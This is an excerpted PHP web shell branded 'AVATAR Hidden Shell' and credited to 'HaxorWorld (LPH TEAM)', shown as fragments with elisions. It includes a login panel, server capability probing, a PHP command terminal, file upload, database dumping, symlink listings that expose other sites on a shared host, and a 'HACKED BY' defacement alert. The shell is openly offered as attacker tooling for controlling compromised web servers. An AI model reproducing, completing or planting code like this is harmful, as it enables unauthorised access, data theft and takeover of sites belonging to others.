...
$GLOBALS['DB_NAME'] = $GLOBALS['AVATAR'];
...
define("__hantam_CODE_NAME__", "AVATAR");
...
$GLOBALS['__hantam_COLOR__'] = array(
		...
		"hidden_shell_text" => array(
			"key_color" => "#24ff03","multi_selector" => array(
				"#hidden_sh a" => "color: {color};",
			)
		),
		"hidden_shell_version" => "#24ff03",
		"shell_name" => "#ff0000",
...
<center><img style="border-radius:100px;"width="500" height="250" alt="AVATAR" draggable="false" src="https://i.postimg.cc/QC9cNxS0/380aa5a57ad90e4046ea1f37d5527e7e.png" /></center>
<div id=loginbox><p><font face="DejaVu Sans" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="gold"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="black" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="Georgia"><b>AVATAR</b></font></th></tr>
...
echo '<html>';
echo "<title>AVATAR Hidden Shell</title>";
...
echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@hantamGetCwd()) . "/<br />";
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#42ff59;">'.__hantam_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__hantam_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="200" height="200" alt="Wukong_Exploit" draggable="false" src="https://i.postimg.cc/tCrsTVYk/9050d416e2b07d8edaeb648b76a8ad15.jpg" /></td>
</tr>
<tr>
...
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="hantam_solevisible"><center><a href="https://t.me/xpl808" target="_blank"><span><font class="solevisible-text" color="#24ff03">Thinker & Explorer</font></span></a></center></div></td>
</tr>
<tr>
...
function __showicon($r){
	$s['btn']='https://i.postimg.cc/FzT0NWMg/9c3abef55b0aaff24f74a11170cbf4dc.png';
	$s['hantammini']='https://i.postimg.cc/FzT0NWMg/9c3abef55b0aaff24f74a11170cbf4dc.png';
...
'td6' =>
array('color' => 'FFFFFF', 'tdName' => 'Key: ', 'inputName' => 'key', 'inputValue' => 'hantam', 'inputSize' => '50')
);
create_table($table);
echo("<p>{$select}</p>");
echo($textarea);
...
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['hantam3'])?$GLOBALS['DB_NAME']['user']:$_POST['hantam3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['hantam5']=='>>'){
echo __pre();
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://i.postimg.cc/QC9cNxS0/380aa5a57ad90e4046ea1f37d5527e7e.png'><br>
<font color='#FFFFFF'>Shell ReCoded By HaxorWorld (LPH TEAM)</font><br>
<font color='#00A220'>Contact : AVATAR</font><br>
...
$table = array('td1' =>
 ...
 array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Dump Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']).'hantam.sql', 'inputSize' => '50')
);
create_table($table);
echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
$username = ($_POST['hantam3']);
...
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='hantamOpenPhpTerminal();return false;' class='foottable hantam_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='http://solevisible.com/icons/menu/terminal.svg'> Terminal</button><br></form></td>
</tr>
<tr>
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='hantam-copyright'><span class='copyright'>[ AVATAR &copy;-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"HACKED BY HAXORWORLD\");' style='color: #E91E63;text-decoration: none;'>Contact Me at</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>AVATAR</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href=''></a></span></div></td>
</tr>
</table>
</div>
...
if($move_cmd_file&&$hantam_canruncmd){
	...
	if(@move_uploaded_file($file['tmp_name'],$file['name'])){
		...
		$file_perm = hantamPermsColor($file['name']);
...
echo '<font color="#FFFFFF"><b>Can\'t set permissions!</b></font><br><script>document.mf.hantam3.value="";</script>';}
}else{echo('Success!');}
}
clearstatcache();
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__hantam_DATA_FOLDER__.'/hantamsymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://i.postimg.cc/QC9cNxS0/380aa5a57ad90e4046ea1f37d5527e7e.png\"></p>";
...
echo("<center><table border='1'>");
echo("<tr><td><b><font color=\"#24ff03\">Register</font></td><td>$registrar</td></tr></b>");
echo("<tr><td><b><font color=\"#24ff03\">Setting</font></td><td>$setting</td></tr></b>");
echo("<tr><td><b><font color=\"#24ff03\">Value</font></td><td>$value</td></tr></b>");
echo "</table><br><br></center>";
}
}
